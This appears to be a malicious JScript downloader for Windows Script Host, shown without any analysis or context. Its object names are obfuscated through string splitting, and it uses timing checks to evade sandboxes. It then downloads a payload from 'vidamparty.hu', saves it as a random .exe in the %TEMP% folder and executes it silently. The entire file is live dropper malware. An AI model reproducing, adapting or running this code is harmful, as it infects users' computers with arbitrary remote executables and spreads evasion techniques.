var L = false;
var Q = "Create"+"Object";
var A = function T() {return WScript[Q]("WScript"+".Shell");}(), T0 = 11;
var K0 = "MSXML2"+".XMLHTTP";
var FB = 2;
var C = FB - 2;
function MZ(B){A["Run"](B, C, C);};
function I(){return K0 + "";};
function V(J, Z1){C = C * 1; return J - Z1;};
function SD(){return Q;};
/*@cc_on
  @if (@_win32 || @_win64)
    L = true;
  @end
@*/
if (L)
{
var U = "";
function S(){return 22;};
var NL = 0; var UM = 0;
function H()
{
var R = new this["Date"]();
var I0 = R["getUTCMilliseconds"]();
WScript["Sleep"](S());
var R = new this["Date"]();
var G0 = R["getUTCMilliseconds"]();
WScript["Sleep"](S());
var R = new this["Date"]();
var QP = R["getUTCMilliseconds"]();
var NL = "X";
NL = V(G0, I0);
var UM = "ZT";
UM = V(QP, G0);
U = "open";
return V(NL, UM);
}
var XT = false;
var MT = false;
for (var NB = C; NB < S() * 1; NB++){if (H() != C){
XT = true; 
UM = "31" + 11 * NL + UM; 
MT = true; 
break;
}}
function Z() {return ((XT == true) && (XT == MT)) ? 1 : C;};
if (XT && Z() && MT){
function BG() {return A["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KsnfGu5w5.ex" + "e";};
 U0 = I();
 HF = WScript[Q](U0);
 var XO = 1;
do { 
	for (;XO;){
	try {
		if (XO == 1)
		{
			HF[U]("GET", "http://vidamparty.hu/as0ldr", false);
			HF["send"]();
			I1 = "Sleep";
			XO = 2;
		}
		WScript[I1](S() + 120); 
		if (HF["readystate"] < 2 * 2) continue;
		XO = C;
		function YX(G) {var K = (1, 2, 3, 4, 5, G); return K;};
		GU = WScript[SD()]("ADODB.Stream");
		U0 = GU;
		U0[U]();
		U0["type"] = YX(1);
		U0["write"](HF["ResponseBody"]);
		GU["position"] = YX(C);
		U0["Save" + "ToFile"](BG(), 2);
		GU["cl"+"ose"]();
		Z0 = BG();
		MZ(Z0);
	} catch(ZU){};};
}while (XO);
}
}

